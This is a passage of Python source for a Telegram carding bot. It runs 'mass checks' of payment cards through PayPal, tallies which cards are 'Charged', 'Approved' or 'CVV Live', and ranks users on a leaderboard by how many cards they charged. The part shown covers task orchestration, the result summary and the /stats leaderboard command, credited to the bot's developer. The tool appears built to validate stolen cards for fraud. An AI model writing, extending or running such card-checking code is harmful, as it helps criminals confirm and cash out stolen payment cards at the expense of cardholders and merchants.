                        user_manager.increment_hits(u_id)
                
                user_manager.increment_checks(u_id, 1)
                return result, card
        
        # Process all cards
        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
        
        for coro in asyncio.as_completed(tasks):
            if u_id not in princess_active_tasks:
                break
            try:
                await coro
            except Exception as e:
                print(f"❌ Task error: {e}")
                async with stats_lock:
                    stats["errors"] += 1
        
        if u_id in princess_active_tasks:
            total_time = time.time() - start_time
            minutes = int(total_time // 60)
            seconds = int(total_time % 60)
            
            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
            
            summary = (
                f"{skull_emoji} <b>Princess PayPal Mass Check Complete</b>\n\n"
                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
                f"{ccn_emoji} <b>CVV Live</b> ➛ {stats['ccn']}\n"
                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
                f"📝 <b>Total</b> ➛ {total}\n"
                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
            )
            
            await update_progress(total)
            await message.reply_text(summary, parse_mode=ParseMode.HTML)
            print(f"📊 Final summary sent to user {u_id}")
        
        return stats
        
    except Exception as e:
        print(f"❌ Princess mass check error: {e}")
        traceback.print_exc()
        try:
            if progress_msg:
                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
        except:
            pass
    finally:
        princess_active_tasks.pop(u_id, None)
        print(f"🏁 [Princess Mass] Session ended for user {u_id}")
        
        
async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show leaderboard of users with most charged cards - /stats"""
    
    if not await verify_group_access(update, context):
        return
    
    # Premium emojis
    charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
    skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
    trophy_emoji = premium_emoji(PREMIUM_EMOJI_IDS["trophy"], "🏆")
    
    # Get top users from leaderboard
    period = 'alltime'
    if context.args and context.args[0] in ['daily', 'weekly', 'monthly', 'alltime']:
        period = context.args[0]
    
    # Get top 10 users
    top_users = leaderboard.get_top_users(period, 10)
    
    # If no data, show empty state
    if not top_users or "No data" in top_users:
        await update.message.reply_text(
            f"{trophy_emoji} <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
            f"━━━━━━━━━━━━━━━━\n"
            f"📊 <b>No data yet</b>\n\n"
            f"💡 Start checking cards to appear on the leaderboard!\n"
            f"{skull_emoji} <b>Dev</b> ➺ @lencax",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        return
    
    # Parse the leaderboard text to extract users
    lines = top_users.split('\n')
    users = []
    
    for line in lines:
        # Look for patterns like "🥇 @username"
        match = re.search(r'([🥇🥈🥉\d\.]+)\s+<b>([^<]+)</b>', line)
        if match:
            rank = match.group(1)
            username = match.group(2)
            
            # Look for hits in the same or next lines
            hits_match = re.search(r'💳\s*Hits:\s*(\d+)', line)
            if not hits_match:
                # Check next lines for hits
                next_line_index = lines.index(line) + 1
                if next_line_index < len(lines):
                    next_line = lines[next_line_index]
                    hits_match = re.search(r'💳\s*Hits:\s*(\d+)', next_line)
            
            hits = int(hits_match.group(1)) if hits_match else 0
            
            users.append({
                'rank': rank,
                'username': username,
                'hits': hits
            })
    
    # If parsing failed, try to get data directly from leaderboard stats
    if not users:
        # Get raw data from leaderboard
        leaderboard.check_reset()
        data = leaderboard.stats.get(period, {})
        
        if data:
            sorted_users = sorted(data.items(), key=lambda x: x[1]['hits'], reverse=True)[:10]
            medals = ['🥇', '🥈', '🥉']
            
            for i, (user_id, user_data) in enumerate(sorted_users, 1):
                medal = medals[i-1] if i <= 3 else f"{i}."
                username = user_data.get('username', f"User {user_id[:6]}")
                hits = user_data.get('hits', 0)
                
                users.append({
                    'rank': medal,
                    'username': username,
                    'hits': hits
                })
    
    # Build the message
    message = f"{trophy_emoji} <b>Lᴇᴀᴅᴇʀʙᴏᴀʀᴅ (Cʜᴀʀɢᴇᴅ)</b>\n"
    message += f"━━━━━━━━━━━━━━━━\n"
    message += f"🏆 Leaderboard - {period.upper()}\n\n"
    
    if users:
        for user in users[:10]:
            if user['hits'] > 0:
                message += f"{user['rank']} <b>{user['username']}</b> {charged_emoji} Hits: {user['hits']}\n"
    else:
        # Fallback: use raw text but clean it up
        lines = top_users.split('\n')
        for line in lines:
            if '🥇' in line or '🥈' in line or '🥉' in line or any(f"{i}." in line for i in range(1, 11)):
                # Keep only the rank and username
                clean_line = re.sub(r'\s*├─.*$', '', line)
                clean_line = re.sub(r'\s*└─.*$', '', clean_line)
                if clean_line.strip():
                    message += clean_line + "\n"
    
    message += f"\n━━━━━━━━━━━━━━━━\n"
    message += f"{skull_emoji} <b>Dev</b> ➺ @lencax"
    
    # Create keyboard with refresh button
    keyboard = [

    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(message, parse_mode=ParseMode.HTML, reply_markup=reply_markup)


